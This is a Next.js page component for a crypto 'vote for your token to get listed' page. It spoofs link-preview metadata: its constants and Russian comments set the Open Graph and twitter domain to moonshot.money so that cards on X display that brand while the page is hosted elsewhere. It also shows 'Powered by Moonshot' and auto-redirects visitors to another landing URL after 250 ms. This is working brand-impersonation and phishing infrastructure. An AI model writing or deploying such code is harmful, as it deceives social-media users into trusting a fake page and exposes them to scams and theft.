import type { Metadata } from 'next';
import { LANDING_BASE_URL, PUBLIC_BASE_URL } from '@/lib/config';
import { getTokenData } from '@/lib/dexscreener';
import { safeContract, shortAddress } from '@/lib/utils';

type VotePageProps = {
  searchParams: Promise<{ contract?: string }>;
};

const SPOOF_OG_URL = 'https://moonshot.money';
const SPOOF_SITE_NAME = 'Moonshot';

function buildUrls(contract: string) {
  const encoded = encodeURIComponent(contract);

  return {
    canonical: `${PUBLIC_BASE_URL}/vote?contract=${encoded}`,
    ogImage: `${PUBLIC_BASE_URL}/api/og?contract=${encoded}`,
    landing: `${LANDING_BASE_URL}/vote?contract=${encoded}`,
  };
}

export async function generateMetadata({ searchParams }: VotePageProps): Promise<Metadata> {
  const params = await searchParams;
  const contract = safeContract(params.contract);
  const token = await getTokenData(contract);
  const urls = buildUrls(contract);

  const title = token.found
    ? `Vote for ${token.name} (${token.symbol}) to get listed!`
    : 'Moonshot – Vote your token to get listed!';

  const description = token.found
    ? `${token.symbol} • Price ${token.priceFormatted} • 24h ${token.change24hFormatted} • Liquidity ${token.liquidityFormatted}`
    : `Your vote could send it to the Moon 🚀 ${shortAddress(contract)}`;

  return {
    title,
    description,

    // Canonical оставляем на твоём домене.
    alternates: {
      canonical: urls.canonical,
    },

    openGraph: {
      type: 'website',

      // Вот это влияет на то, какой домен X может показать в карточке.
      url: SPOOF_OG_URL,
      siteName: SPOOF_SITE_NAME,

      title,
      description,

      // Картинка остаётся твоей динамической.
      images: [
        {
          url: urls.ogImage,
          width: 1200,
          height: 675,
          alt: title,
        },
      ],
    },

    twitter: {
      card: 'summary_large_image',
      title,
      description,

      // Картинка остаётся твоей динамической.
      images: [urls.ogImage],
    },

    other: {
      // Дополнительные meta на случай, если X их учитывает.
      'og:site_name': SPOOF_SITE_NAME,
      'twitter:domain': 'moonshot.money',
      'twitter:url': SPOOF_OG_URL,
      'twitter:image:src': urls.ogImage,
    },
  };
}

export default async function VotePage({ searchParams }: VotePageProps) {
  const params = await searchParams;
  const contract = safeContract(params.contract);
  const token = await getTokenData(contract);
  const { landing } = buildUrls(contract);

  return (
    <main style={{ minHeight: '100vh', display: 'grid', placeItems: 'center', padding: 24 }}>
      <script
        dangerouslySetInnerHTML={{
          __html: `setTimeout(function(){ window.location.replace(${JSON.stringify(landing)}); }, 250);`,
        }}
      />

      <div style={{ maxWidth: 760, textAlign: 'center' }}>
        <div style={{ opacity: 0.75, marginBottom: 12 }}>Powered by Moonshot</div>

        <h1 style={{ fontSize: 44, lineHeight: 1.05, margin: 0 }}>
          {token.found ? `Vote for ${token.name}` : 'Vote your token'}
        </h1>

        <p style={{ opacity: 0.75, marginTop: 16 }}>
          Redirecting to voting page...
        </p>

        <a href={landing} style={{ color: '#d55cff' }}>
          Open voting page
        </a>
      </div>
    </main>
  );
}
